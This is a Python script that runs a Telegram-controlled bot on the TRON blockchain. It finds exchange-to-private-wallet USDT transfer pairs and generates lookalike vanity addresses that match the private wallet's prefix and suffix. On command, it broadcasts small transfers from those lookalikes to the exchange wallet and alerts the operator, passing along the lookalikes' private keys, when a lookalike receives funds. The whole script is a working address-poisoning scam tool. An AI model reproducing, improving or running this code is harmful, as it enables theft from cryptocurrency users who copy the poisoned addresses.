import os
import time
import requests
from collections import defaultdict
from datetime import datetime, timedelta, timezone

print("🚀 Starting Debug Scanner (No Balance Check)...")

# =========================
#  SETTINGS - NO CEX BALANCE CHECK
# =========================
TARGET_PAIRS = 5
MIN_TRANSFER_USD = 50           # Each transfer must be >$50
WEEKS_BACK = 2
GAS_COST_PER_PAIR = 2.2
MAX_SCAN_MINUTES = 10

TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "")
CHAT_ID = os.getenv("CHAT_ID", "")
TRONSCAN_API_KEY = os.getenv("TRONSCAN_API_KEY", "")
TRONGRID_API_KEY = os.getenv("TRONGRID_API_KEY", "")
PRIVATE_KEY = os.getenv("PRIVATE_KEY", "")

CEX_KEYWORDS = ['binance', 'okx', 'huobi', 'htx', 'gate', 'kucoin', 'bybit', 'mexc', 'bitfinex', 'coinbase', 'kraken', 'bitget', 'poloniex']

found_pairs = []
excluded_pairs = set()
vanity_wallets = {}
checked_wallets = set()
TELEGRAM_URL = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}"

def send_telegram(message):
    try:
        requests.post(f"{TELEGRAM_URL}/sendMessage", json={"chat_id": CHAT_ID, "text": message, "parse_mode": "HTML"}, timeout=10)
    except: pass

def get_usdt_balance(address):
    try:
        headers = {"TRON-PRO-API-KEY": TRONGRID_API_KEY} if TRONGRID_API_KEY else {}
        r = requests.get(f"https://api.trongrid.io/v1/accounts/{address}/trc20/balance", 
                         params={"contract_address": "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"},
                         headers=headers, timeout=10)
        data = r.json()
        if data.get("data"):
            return int(data["data"][0].get("balance", 0)) / 1_000_000
        return 0
    except: return 0

def get_wallet_history(address, limit=10):
    try:
        r = requests.get(
            "https://apilist.tronscanapi.com/api/token_trc20/transfers",
            params={"address": address, "limit": limit, "sort": "-timestamp"},
            headers={"TRON-PRO-API-KEY": TRONSCAN_API_KEY} if TRONSCAN_API_KEY else {},
            timeout=10
        )
        return r.json().get("token_transfers", [])
    except: return []

def generate_vanity_wallet(target_address, max_attempts=50000):
    print(f"  🔨 Generating vanity wallet...")
    try:
        from tronpy.keys import PrivateKey
    except:
        return None, None, 0, 0
        
    best_addr, best_key, best_score = None, None, 0
    best_prefix, best_suffix = 0, 0
    
    for attempt in range(max_attempts):
        key = PrivateKey.random()
        addr = key.public_key.to_base58check_address()
        
        prefix_match = sum(1 for i in range(8) if i < len(addr) and i < len(target_address) and addr[i] == target_address[i])
        suffix_match = sum(1 for i in range(1, 9) if i <= len(addr) and i <= len(target_address) and addr[-i] == target_address[-i])
        total_score = prefix_match + suffix_match
        
        if total_score > best_score:
            best_score = total_score
            best_prefix = prefix_match
            best_suffix = suffix_match
            best_addr = addr
            best_key = key.hex()
            if best_score >= 8: break
            
    print(f"  ✅ Generated: {best_prefix}/8 + {best_suffix}/8 = {best_score}/16")
    return best_addr, best_key, best_prefix, best_suffix

send_telegram("🚀 <b>Debug Scanner Started</b>\nScanning for 10 minutes.\nRules: >$50/transfer, 2+ sends in 2 weeks.\n**NO CEX BALANCE CHECK**")

# =========================
# PHASE 1: PERSISTENT SCAN
# =========================
end_date = datetime.now(timezone.utc)
start_date = end_date - timedelta(weeks=WEEKS_BACK)
start_ms = int(start_date.timestamp() * 1000)
end_ms = int(end_date.timestamp() * 1000)

print(f" Scanning: {start_date.strftime('%Y-%m-%d')} to {end_date.strftime('%Y-%m-%d')}")

start_time = time.time()
offset = 0
patterns_found = 0  # Track ALL patterns, not just qualified ones

print("🔄 Starting persistent loop...")

while len(found_pairs) < TARGET_PAIRS and (time.time() - start_time) < (MAX_SCAN_MINUTES * 60):
    elapsed = int(time.time() - start_time)
    print(f"\n⏱️  Time: {elapsed}s | Pairs: {len(found_pairs)}/{TARGET_PAIRS} | Patterns: {patterns_found}")
    
    try:
        r = requests.get(
            "https://apilist.tronscanapi.com/api/token_trc20/transfers",
            params={
                "start": offset,
                "limit": 100,
                "contract_address": "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
                "sort": "-timestamp"
            },
            headers={"TRON-PRO-API-KEY": TRONSCAN_API_KEY} if TRONSCAN_API_KEY else {},
            timeout=30
        )
        
        transfers = r.json().get("token_transfers", [])
        if not transfers:
            print("  ⚠️ No transfers, waiting...")
            time.sleep(15)
            continue
            
        print(f"   📥 Got {len(transfers)} transfers")
        
        batch_receivers = set()
        for tx in transfers:
            to_addr = tx.get("to_address")
            if to_addr and to_addr not in checked_wallets:
                batch_receivers.add(to_addr)
                
        print(f"  🎯 Checking {len(batch_receivers)} new wallets...")
        
        for wallet_b in batch_receivers:
            if len(found_pairs) >= TARGET_PAIRS: break
            checked_wallets.add(wallet_b)
            
            try:
                r_hist = requests.get(
                    "https://apilist.tronscanapi.com/api/token_trc20/transfers",
                    params={
                        "address": wallet_b, 
                        "start_timestamp": start_ms, 
                        "end_timestamp": end_ms,
                        "limit": 200,
                        "contract_address": "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"
                    },
                    headers={"TRON-PRO-API-KEY": TRONSCAN_API_KEY} if TRONSCAN_API_KEY else {},
                    timeout=30
                )
                
                history = r_hist.json().get("token_transfers", [])
                
                by_sender = defaultdict(list)
                for tx in history:
                    if tx.get("to_address") == wallet_b:
                        from_addr = tx.get("from_address")
                        amount = int(tx.get("quant", 0)) / 1_000_000
                        tag = tx.get("from_address_tag", {})
                        
                        if from_addr and amount > MIN_TRANSFER_USD:
                            by_sender[from_addr].append({"amount": amount, "tag": tag})
                
                for wallet_a, transfer_list in by_sender.items():
                    if len(transfer_list) >= 2:
                        patterns_found += 1
                        print(f"    🎯 Pattern #{patterns_found}: {wallet_a[:20]}... → {wallet_b[:20]}... ({len(transfer_list)}x)")
                        
                        tag_name = transfer_list[0]["tag"].get("from_address_tag", "").lower() if transfer_list[0]["tag"] else ""
                        is_cex = any(k in tag_name for k in CEX_KEYWORDS)
                        cex_name = transfer_list[0]["tag"].get("from_address_tag", "Unknown") if transfer_list[0]["tag"] else "Unknown"
                        
                        print(f"     Tag: '{tag_name}' | Is CEX: {is_cex}")
                        
                        # Check CEX balance (for info only, NOT for filtering)
                        cex_balance = get_usdt_balance(wallet_a)
                        print(f"    💰 CEX Balance: ${cex_balance} (NOT checking requirement)")
                        
                        if is_cex:
                            total_volume = sum(t["amount"] for t in transfer_list)
                            
                            # ✅ ALWAYS ADD IT - NO BALANCE CHECK!
                            found_pairs.append({
                                "wallet_a": wallet_a,
                                "wallet_b": wallet_b,
                                "cex_name": cex_name,
                                "transfer_count": len(transfer_list),
                                "total_amount": total_volume,
                                "cex_balance": cex_balance
                            })
                            
                            status = "✅" if cex_balance >= 500 else "⚠️ Low Balance"
                            
                            msg = (f"{status} <b>Pair #{len(found_pairs)}</b>\n\n"
                                   f"🏦 <b>Wallet A (CEX):</b> {cex_name}\n<code>{wallet_a}</code>\n"
                                   f" <b>CEX Balance:</b> ${cex_balance:,.2f} <i>(current)</i>\n\n"
                                   f"👤 <b>Wallet B (Private):</b>\n<code>{wallet_b}</code>\n\n"
                                   f"📊 <b>2-Week Pattern:</b>\n"
                                   f"• Wallet A sent to Wallet B: <b>{len(transfer_list)} times</b>\n"
                                   f"• Each transfer: >${MIN_TRANSFER_USD}\n"
                                   f"• Total Volume: ${total_volume:,.2f}\n\n"
                                   f"<i>Note: CEX balance is low because hot wallets are swept</i>")
                            
                            send_telegram(msg)
                            print(f"    ✅ Added Pair #{len(found_pairs)}!")
                        else:
                            print(f"    ❌ Not a CEX")
                                
            except Exception as e:
                print(f"    ❌ Error: {e}")
            
            time.sleep(0.5)
            
        offset += 100
        
        if len(found_pairs) < TARGET_PAIRS:
            print(f"  ⏳ Waiting 15s...")
            time.sleep(15)
            
    except Exception as e:
        print(f"❌ Error: {e}")
        time.sleep(10)

print(f"\n📊 Final Stats:")
print(f"  Total patterns found: {patterns_found}")
print(f"  Qualified pairs: {len(found_pairs)}")

# =========================
# PHASE 2: INTERACTIVE MODE
# =========================
def get_active_pairs():
    return [p for i, p in enumerate(found_pairs) if (i+1) not in excluded_pairs]

def calc_cost():
    return len(get_active_pairs()) * GAS_COST_PER_PAIR

if found_pairs:
    send_telegram(f"🎯 <b>Found {len(found_pairs)} pairs!</b>\n\nCommands:\n• <b>info</b>\n• <b>exclude [1-5]</b>\n• <b>history [wallet]</b>\n• <b>cost</b>\n• <b>vanity [ID] [Pair#]</b>\n• <b>transfer</b>")
else:
    send_telegram(f"⚠️ <b>No pairs found in 10 minutes.</b>\nPatterns detected: {patterns_found}\nCheck logs above.")

last_id = 0
start_wait = time.time()

while True:
    if time.time() - start_wait > 600:
        send_telegram("⏰ <b>Timed out</b>")
        break

    try:
        updates = requests.get(f"{TELEGRAM_URL}/getUpdates", params={"offset": last_id, "timeout": 30}, timeout=35).json().get("result", [])
    except: updates = []
    
    for u in updates:
        last_id = u["update_id"] + 1
        
        if u.get("message") and str(u["message"]["chat"]["id"]) == str(CHAT_ID):
            text = u["message"].get("text", "").strip()
            parts = text.lower().split()
            
            if parts[0] == "info":
                if not found_pairs:
                    send_telegram("No pairs found")
                else:
                    active = get_active_pairs()
                    msg = f"📋 <b>Pairs ({len(active)}/{len(found_pairs)} active)</b>\n"
                    if excluded_pairs: msg += f"<i>Excluded: {sorted(excluded_pairs)}</i>\n\n"
                    for i, p in enumerate(found_pairs):
                        status = "" if (i+1) in excluded_pairs else "✅"
                        msg += f"<b>#{i+1} {status} {p['cex_name']}</b>\n"
                        msg += f"🏦 Wallet A: <code>{p['wallet_a']}</code>\n"
                        msg += f"💼 CEX Balance: ${p['cex_balance']:,.2f}\n"
                        msg += f" Wallet B: <code>{p['wallet_b']}</code>\n"
                        msg += f" {p['transfer_count']}x | Vol: ${p['total_amount']}\n\n"
                    send_telegram(msg)
            
            elif parts[0] == "exclude" and len(parts) > 1:
                try:
                    num = int(parts[1])
                    if 1 <= num <= len(found_pairs):
                        excluded_pairs.add(num)
                        send_telegram(f"🗑️ <b>Pair #{num} excluded</b>")
                except: send_telegram("❌ Use: <code>exclude 1</code>")
            
            elif parts[0] == "history" and len(parts) > 1:
                addr = parts[1]
                send_telegram(f"🔍 <b>History:</b>\n<code>{addr[:30]}...</code>")
                txs = get_wallet_history(addr, 10)
                if txs:
                    msg = " <b>Last 10 Transactions</b>\n\n"
                    for i, tx in enumerate(txs[:10]):
                        amount = int(tx.get("quant", 0)) / 1_000_000
                        from_addr = tx.get("from_address", "Unknown")
                        date = datetime.fromtimestamp(tx.get("block_ts", 0)/1000).strftime("%m/%d %H:%M")
                        msg += f"<b>#{i+1}</b> {date}\n💰 ${amount:,.2f}\nFrom: <code>{from_addr[:20]}...</code>\n\n"
                    send_telegram(msg)
                else: send_telegram(" No transactions")
            
            elif parts[0] == "cost":
                total = calc_cost()
                active = len(get_active_pairs())
                send_telegram(f"💰 <b>Gas Estimate</b>\n\nActive pairs: {active}\nCost: {total} TRX (~${total * 0.15:.2f})")
            
            elif parts[0] == "vanity" and len(parts) >= 2:
                try:
                    vid = int(parts[1])
                    if len(parts) == 3 and parts[2].isdigit():
                        p_num = int(parts[2]) - 1
                        if 0 <= p_num < len(found_pairs):
                            addr, key, prefix, suffix = generate_vanity_wallet(found_pairs[p_num]['wallet_b'])
                            if not addr:
                                send_telegram("❌ Error generating vanity.")
                                continue
                            vanity_wallets[vid] = {
                                "address": addr, "private_key": key,
                                "target_pair": p_num+1, "target_wallet_b": found_pairs[p_num]['wallet_b'],
                                "prefix_match": prefix, "suffix_match": suffix,
                                "alert_active": False, "last_balance": 0
                            }
                            send_telegram(f"✅ <b>Vanity #{vid} Created</b>\n\n"
                                        f"<b>Mimics Wallet B:</b>\n<code>{found_pairs[p_num]['wallet_b']}</code>\n\n"
                                        f"<b>Vanity Address:</b>\n<code>{addr}</code>\n\n"
                                        f"<b>Similarity:</b>\n• Prefix: {prefix}/8\n• Suffix: {suffix}/8\n• Total: {prefix+suffix}/16\n\n"
                                        f"Type <code>vanity {vid} alert</code> to enable alerts")
                    elif len(parts) == 3 and parts[2] == "alert":
                        if vid in vanity_wallets:
                            vanity_wallets[vid]["alert_active"] = True
                            send_telegram(f"🔔 <b>Alerts ON for #{vid}</b>")
                    elif len(parts) == 2:
                        if vid in vanity_wallets:
                            v = vanity_wallets[vid]
                            try:
                                headers = {"TRON-PRO-API-KEY": TRONGRID_API_KEY} if TRONGRID_API_KEY else {}
                                r_trx = requests.get(f"https://api.trongrid.io/v1/accounts/{v['address']}", params={"only_confirmed": "true"}, headers=headers, timeout=10)
                                trx_bal = int(r_trx.json().get("data", [{}])[0].get("balance", 0)) / 1_000_000 if r_trx.json().get("data") else 0
                                
                                if trx_bal > v["last_balance"] and v["alert_active"]:
                                    send_telegram(f"🚨 <b>ALERT: Vanity #{vid} Received Funds!</b>\n\n<b>Address:</b> <code>{v['address']}</code>\n<b>TRX:</b> {trx_bal:.6f}\n️ <b>Private Key:</b> <code>{v['private_key']}</code>")
                                    v["last_balance"] = trx_bal
                                
                                send_telegram(f"📊 <b>Vanity #{vid}</b>\n\n<b>Address:</b> <code>{v['address']}</code>\n<b>Private Key:</b> <code>{v['private_key']}</code>\n\n<b>Mimics:</b> <code>{v['target_wallet_b'][:30]}...</code>\n<b>Similarity:</b> {v['prefix_match']}/{v['suffix_match']}\n\n<b>TRX Balance:</b> {trx_bal:.6f}\n<b>Alerts:</b> {'🔔 ON' if v['alert_active'] else '🔕 OFF'}")
                            except Exception as e: send_telegram(f"❌ Error: {e}")
                        else: send_telegram(f"❌ Vanity #{vid} not found")
                except Exception as e: send_telegram(f"❌ Error: {e}")
            
            elif parts[0] == "transfer":
                active = get_active_pairs()
                if not active:
                    send_telegram("❌ No active pairs")
                else:
                    send_telegram(f"🚀 <b>Executing {len(active)} transfers...</b>\nCost: ~{calc_cost()} TRX")
                    try:
                        from tronpy import Tron
                        from tronpy.keys import PrivateKey
                        tron = Tron()
                        priv = PrivateKey(bytes.fromhex(PRIVATE_KEY.replace('0x', '')))
                        main_addr = priv.public_key.to_base58check_address()
                        
                        pair_num = 1
                        for i, pair in enumerate(found_pairs):
                            if (i+1) in excluded_pairs: continue
                            
                            v_key = None
                            for vid, v in vanity_wallets.items():
                                if v["target_pair"] == i + 1:
                                    v_key = PrivateKey(bytes.fromhex(v['private_key']))
                                    v_addr = v['address']
                                    break
                            if not v_key:
                                v_key = PrivateKey.random()
                                v_addr = v_key.public_key.to_base58check_address()
                            
                            tx1 = tron.trx.transfer(main_addr, v_addr, 1).build().sign(priv).broadcast().txid
                            time.sleep(3)
                            tx2 = tron.trx.transfer(v_addr, pair['wallet_a'], 1).build().sign(v_key).broadcast().txid
                            
                            send_telegram(f"✅ <b>#{pair_num}</b>\nTX1: <code>{tx1}</code>\nTX2: <code>{tx2}</code>")
                            pair_num += 1
                            time.sleep(5)
                        send_telegram("✅ <b>Done!</b>")
                    except Exception as e: send_telegram(f"❌ Error: {e}")
                    break

    time.sleep(5)

print("✅ Done")
